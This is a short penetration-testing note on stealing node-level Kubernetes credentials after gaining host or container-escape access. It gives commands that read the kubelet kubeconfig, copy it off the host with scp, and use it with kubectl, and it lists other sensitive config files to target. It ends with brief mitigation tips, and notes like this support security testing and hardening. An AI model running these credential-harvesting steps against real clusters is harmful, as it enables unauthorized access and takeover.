# Pentesting Note: Accessing Node Level Kubernetes Configuration

## Objective
Gain access to the host system, obtain the node-level kubeconfig file, and query Kubernetes nodes using the obtained configuration. Additionally, assess the container's file systems and capabilities.

## Steps

### 1. Gain Access to the Host System
- **Objective**: Access the host system running the Kubernetes node.

### 2. Obtain the Node-Level Kubeconfig File
- **Path**: The node-level kubeconfig file is typically located at:
  ```sh
  /var/lib/kubelet/kubeconfig
  ```

- **Steps**:
  1. **Access the File**:
     ```sh
     cat /var/lib/kubelet/kubeconfig
     ```
  2. **Securely Transfer the File**: Use tools like `scp` to transfer the file to your local system for analysis.
     ```sh
     scp user@host:/var/lib/kubelet/kubeconfig /local/path/kubeconfig
     ```

### 3. Query Kubernetes Nodes Using the Obtained Configuration
- **Setup Kubeconfig**:
  ```sh
  export KUBECONFIG=/local/path/kubeconfig
  ```

- **Query Nodes**:
  ```sh
  kubectl get nodes
  ```

### 4. Assess Mounted File Systems and Container Capabilities
- **List Mounted File Systems**:
  ```sh
  mount
  df -h
  ```

- **Check Container Capabilities Using `capsh`**:
  ```sh
  capsh --print
  ```

### 5. Escaped Container?
- **Recon the System**:
  - **Interesting Locations**:
    - **Kubeconfig File**:
      ```sh
      cat /var/lib/kubelet/kubeconfig
      ```

    - **Other Potentially Sensitive Files**:
      - `/etc/kubernetes/admin.conf`
      - `/etc/kubernetes/kubelet.conf`
      - `/etc/kubernetes/controller-manager.conf`
      - `/etc/kubernetes/scheduler.conf`
      - `/root/.kube/config`

### 6. Mitigation Tips
- **Limit Capabilities**: Reduce the capabilities granted to containers to the minimum necessary.
- **Secure Configurations**: Ensure that sensitive files like kubeconfig are not accessible to unauthorized users.
- **Monitor File Access**: Implement monitoring for access to sensitive files and directories.

